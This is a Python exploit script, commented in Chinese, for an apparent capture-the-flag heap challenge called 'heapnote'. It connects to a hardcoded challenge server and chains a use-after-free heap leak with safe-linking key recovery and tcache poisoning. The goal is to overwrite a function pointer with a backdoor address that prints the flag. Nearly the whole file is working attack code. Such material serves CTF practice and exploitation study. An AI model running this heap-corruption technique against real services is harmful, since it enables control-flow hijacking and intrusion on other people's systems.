#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""heapnote —— UAF/堆残留泄露 + tcache poisoning（safe-linking）打 backdoor

附件: attachments/pwn（amd64，非 PIE、canary、NX、Full RELRO，
      符号 backdoor@0x4011fe；菜单 1 add / 2 delete / 3 edit / 4 show / 5 call / 6 exit；
      call 会跳到 BSS 上的函数指针 0x404040；backdoor 里执行 cat ./flag）

思路（与手搓 p4.py 一致，仅端口 36225 -> 36041）:
  1) add(0, 64, "A"*64) 后 delete(0)，chunk 进 tcache，fd = chunk>>12（safe-linking 且 next=NULL）
  2) show(0) 读出 8 字节 fd -> 得到 heap key（chunk>>12）
  3) edit(0, p64(0x404040 ^ key) + 0*56) 把 tcache 下个指针改成 0x404040
  4) add(1, 64, "B"*64) 消费原 chunk；add(2, 64, p64(0x4011fe)+...) 在 0x404040 落 backdoor 地址
  5) call(5) -> *(0x404040)() -> backdoor -> cat ./flag

用法: python exp.py [HOST PORT]
"""
import re
import select
import socket
import struct
import sys
import time

HOST, PORT = "219.216.64.241", 36041
if len(sys.argv) >= 3:
    HOST, PORT = sys.argv[1], int(sys.argv[2])
FP, BACKDOOR, SZ = 0x404040, 0x4011FE, 0x40
FLAG_RE = re.compile(rb"(?:flag|nex|FLAG|NEX)\{[^}]{1,200}\}")
p64 = lambda x: struct.pack("<Q", x)


class Tube:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=5)
        self.s.setblocking(False)
        self.buf = b""
        self.log = b""

    def _pump(self, timeout):
        end = time.time() + timeout
        while time.time() < end:
            r, _, _ = select.select([self.s], [], [], 0.2)
            if not r:
                continue
            d = self.s.recv(4096)
            if not d:
                return False
            self.buf += d
            self.log += d
        return True

    def read_until(self, token, timeout=5):
        end = time.time() + timeout
        while token not in self.buf and time.time() < end:
            if not self._pump(0.2):
                break
        i = self.buf.find(token)
        if i < 0:
            out, self.buf = self.buf, b""
            return out
        out, self.buf = self.buf[: i + len(token)], self.buf[i + len(token):]
        return out

    def read_for(self, sec):
        self._pump(sec)
        out, self.buf = self.buf, b""
        return out

    def send(self, data):
        self.s.sendall(data)

    def line(self, data):
        self.s.sendall(data + b"\n")

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


def add(t, idx, size, data):
    t.line(b"1")
    t.read_until(b"idx: ")
    t.line(str(idx).encode())
    t.read_until(b"size: ")
    t.line(str(size).encode())
    t.read_until(b"data: ")
    t.send(data)
    t.read_until(b"done")


def delete(t, idx):
    t.line(b"2")
    t.read_until(b"idx: ")
    t.line(str(idx).encode())
    t.read_until(b"done")


def edit(t, idx, data):
    t.line(b"3")
    t.read_until(b"idx: ")
    t.line(str(idx).encode())
    t.read_until(b"data: ")
    t.send(data)
    t.read_until(b"done")


def show(t, idx, n=8):
    t.line(b"4")
    t.read_until(b"idx: ")
    t.line(str(idx).encode())
    return t.read_for(0.4)[:n]


def main():
    t = Tube(HOST, PORT)
    t.read_until(b"6. exit")

    add(t, 0, SZ, b"A" * SZ)
    delete(t, 0)

    leak = show(t, 0, 8)
    print("[*] raw leak:", leak.hex())
    key = struct.unpack("<Q", leak.ljust(8, b"\x00")[:8])[0]
    print("[*] heap key (chunk>>12) = %#x" % key)

    edit(t, 0, p64(FP ^ key) + b"\x00" * (SZ - 8))
    add(t, 1, SZ, b"B" * SZ)
    add(t, 2, SZ, p64(BACKDOOR) + b"\x00" * (SZ - 8))

    t.line(b"5")
    out = t.read_for(2)
    text = out.decode("utf-8", "replace")
    print("[*] call output:", text.strip()[:600])

    m = FLAG_RE.search(out)
    if m:
        print("[+] FLAG:", m.group(0).decode())
        t.close()
        return 0
    print("[-] 没拿到 flag")
    t.close()
    return 1


if __name__ == "__main__":
    sys.exit(main())
